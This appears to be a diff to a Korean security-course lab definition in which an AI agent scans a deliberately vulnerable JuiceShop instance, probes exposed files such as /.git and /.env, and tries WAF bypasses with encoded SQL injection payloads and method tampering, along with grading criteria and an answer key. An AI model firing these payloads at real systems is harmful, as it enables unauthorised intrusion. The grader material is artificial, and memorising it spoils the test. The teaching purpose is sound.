@@ -502,55 +502,111 @@ steps:
   risk_level: low
   bastion_prompt: 보안 설정 오류 종합 점검 결과를 정리해줘
 - order: 99
-  instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
-  bastion_prompt: '다음 작업들을 순서대로 수행해줘:
+  instruction: |
+    [복합 시나리오] "CVSS v3.1 적용 — 설정 오류 + WAF 우회 점검 → 우선순위 보고서"
 
-    1) nikto를 사용하여 대상 웹 서버(10.20.30.80:3000)의 보안 설정을 스캔해줘
+    ## 상황 (w13 → w14 시나리오 연속)
 
-    2) 각 포트(80, 3000, 8080)의 Server 헤더 정보 노출을 확인해줘
+    > 선배: "보고서 작성법 주차야. 보고서의 핵심은 *우선순위*. CVSS v3.1 점수 + 구현 난이도 두 축으로
+    > 'Quick Win (High Impact + Low Cost)' 부터 정렬해야 의사결정자가 봤을 때 도움 돼.
+    > 설정 오류 + WAF 우회 점검 → CVSS 적용 → 우선순위 보고서. 그게 이번 주 임무."
 
-    3) 디렉터리 리스팅(Directory Listing)이 활성화된 경로를 찾으시오. JuiceShop의 /ftp/, /assets/, /encryptionkeys/
-    등을 확인해줘
+    학습 목표 (lecture #1·#2·#3·#4 CVSS+PoC+보고서+우선순위) + (lab #3·#4·#7·#8 디렉터리·파일·인코딩·메서드 우회) 통합.
 
-    4) 민감 파일 노출을 확인해줘
+    ## 임무 (3 단계, 약 35분)
 
-    5) 에러 메시지를 통한 정보 노출을 확인해줘'
-  hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
-  category: multi_task
+    ### Phase A — 설정 오류 + 민감 파일 노출 점검 (lab #2·#3·#4)
+    1) `for p in '/ftp/' '/assets/' '/encryptionkeys/' '/.git/' '/.env' '/backup.sql'; do
+         echo -n "$p: "; curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80$p"; done`
+    2) Server 헤더: `curl -s -I http://10.20.30.80/ | grep -E "Server|X-Powered"`
+    3) 에러 노출: `curl -s "http://10.20.30.80/api/Users/abc'%22%3E" | head -c 300`
+
+    ### Phase B — WAF 우회 3 기법 (lab #7·#8)
+    동일 SQLi payload 를 3 가지로 변형해 WAF 차단 비교 — JuiceShop 직접:3000 vs nginx WAF:80 (가정).
+    1) URL 이중 인코딩: `curl -s -o /dev/null -w "double-enc: %{http_code}\n"
+       "http://10.20.30.80/rest/products/search?q=%2527%2520OR%25201%253D1--"`
+    2) 대소문자 혼합: `curl -s -o /dev/null -w "case-mix: %{http_code}\n"
+       "http://10.20.30.80/rest/products/search?q=%27%20Or%201%3D1--"`
+    3) HTTP 메서드 변조 + Content-Type: `curl -s -o /dev/null -w "method-PUT: %{http_code}\n"
+       -X PUT -H "Content-Type: application/xml" -d "<x>data</x>" "http://10.20.30.80/rest/user/login"`
+
+    ### Phase C — CVSS v3.1 + 우선순위 보고서
+    | 발견 | CVSS Vector | Score | 구현 난이도 | 우선순위 (Quick Win 순) |
+    | /.git 노출 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | 7.5 (High) | 낮음 (config 1줄) | #1 Quick Win |
+    | Server header 누설 | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3 (Medium) | 낮음 (1줄) | #2 |
+    | WAF URL 이중 인코딩 우회 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 (Critical) | 높음 (룰 재설계) | #3 |
+    | /encryptionkeys 노출 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 (Critical) | 낮음 (autoindex off) | #1 (Critical+Quick) |
+    | 에러 stack trace | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3 (Medium) | 낮음 | #2 |
+
+    표 끝 "권고: Quick Win 4개 (autoindex off + Server 제거 + custom error + .git 차단) 즉시.
+    WAF 룰 재설계는 단계적 적용." 한 줄.
+
+    종료: echo "=== Phase A 노출 ===" / "=== Phase B WAF 우회 ===" / "=== Phase C CVSS+우선순위 ===" 묶음.
+  bastion_prompt: |
+    [복합 시나리오 — w14 CVSS + 우선순위 보고서]
+
+    JuiceShop 설정 오류 + WAF 우회 + CVSS 보고서 3 phase.
+
+    Phase A:
+    `for p in '/ftp/' '/assets/' '/encryptionkeys/' '/.git/' '/.env' '/backup.sql'; do
+       echo -n "$p: "; curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80$p"; done`
+    `curl -s -I http://10.20.30.80/ | grep -E "Server|X-Powered"`
+    `curl -s "http://10.20.30.80/api/Users/abc%27%22" | head -c 300`
+
+    Phase B (WAF 우회 3):
+    `curl -s -o /dev/null -w "double-enc: %{http_code}\n" "http://10.20.30.80/rest/products/search?q=%2527%2520OR%25201%253D1--"`
+    `curl -s -o /dev/null -w "case-mix: %{http_code}\n" "http://10.20.30.80/rest/products/search?q=%27%20Or%201%3D1--"`
+    `curl -s -o /dev/null -w "method-PUT: %{http_code}\n" -X PUT -H "Content-Type: application/xml" -d "<x>data</x>" "http://10.20.30.80/rest/user/login"`
+
+    Phase C (CVSS + 우선순위):
+    ```
+    | 발견 | CVSS Vector | Score | 구현 난이도 | 우선순위 |
+    | /.git 노출 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | 7.5 High | 낮음 | #1 Quick Win |
+    | Server header | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3 Medium | 낮음 | #2 |
+    | WAF URL 이중 인코딩 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 Critical | 높음 | #3 |
+    | /encryptionkeys | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 Critical | 낮음 | #1 Critical+Quick |
+    | 에러 stack trace | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3 Medium | 낮음 | #2 |
+    ```
+    표 끝 "권고: Quick Win 4개 (autoindex off + Server 제거 + custom error + .git 차단) 즉시.
+    WAF 룰 재설계는 단계적." 한 줄.
+
+    종료: echo "=== Phase A 노출 ===" / "=== Phase B WAF 우회 ===" / "=== Phase C CVSS+우선순위 ===" 묶음.
+
+    반드시 3 phase 모두 실행. 중간 종료 금지.
+  hint: |
+    Phase A: 6 경로 + Server 헤더 + 에러 유발 3 정찰.
+    Phase B: 같은 SQLi payload 3 변형. JuiceShop 차단 정상.
+    Phase C: 5행 CVSS 표 + 우선순위 (Quick Win + Critical+Quick + 단계적).
+    포인트: CVSS v3.1 vector + 구현 난이도 두 축 정렬. Quick Win 우선.
+  category: integration_scenario
   points: 50
   verify:
     type: output_contains
-    expect: ''
+    expect: 우선순위
     field: stdout
     semantic:
-      intent: '[통합] 보안 설정 오류 5작업 — default cred/verbose error/exposed file/header/audit
-        통합. OWASP A05.'
+      intent: |
+        설정 오류 + 민감 파일 + WAF 우회 점검 → CVSS v3.1 score + 구현 난이도 우선순위 보고서.
+        lecture #1·#2·#3·#4 + lab #3·#4·#7·#8 동시 행동 증명.
       success_criteria:
-      - 5 설정 작업
-      - exposure
-      - audit
+      - Phase A — 6 경로 + Server 헤더 + 에러 정찰
+      - Phase B — URL 이중 / 대소문자 / 메서드 변조 3 우회
+      - Phase C — 5행 CVSS 표 + 우선순위 + 권고 한 줄
       acceptable_methods:
-      - bastion plan
-      - nuclei
-      - nikto
+      - curl loop + grep
+      - WAF 우회 3 변형
+      - markdown table CVSS vector
+      - DefectDojo / DefectDojo 추가 가능
       negative_signs:
-      - exposure 누락
-      - header 무시
-      - audit 없음
+      - 정찰만 또는 우회만
+      - CVSS vector 누락
+      - 우선순위 누락
+      - Quick Win 개념 누락
   target_vm: attacker
   risk_level: low
-  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
-
-    1) nikto를 사용하여 대상 웹 서버(10.20.30.80:3000)의 보안 설정을 스캔해줘
-
-    2) 각 포트(80, 3000, 8080)의 Server 헤더 정보 노출을 확인해줘
-
-    3) 디렉터리 리스팅(Directory Listing)이 활성화된 경로를 찾으시오. JuiceShop의 /ftp/, /assets/, /encryptionkeys/
-    등을 확인해줘
-
-    4) 민감 파일 노출을 확인해줘
-
-    5) 에러 메시지를 통한 정보 노출을 확인해줘'
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
-    다단계 작업.
+  answer: |
+    🤖 위 bastion_prompt 그대로. 정찰 → WAF 우회 → CVSS 보고서.
+  answer_detail: |
+    CVSS v3.1 vector 표기는 nvd.nist.gov 계산기 형식. Quick Win = High Impact + Low Cost.
+    의사결정자 가독성 핵심.
   script: ''
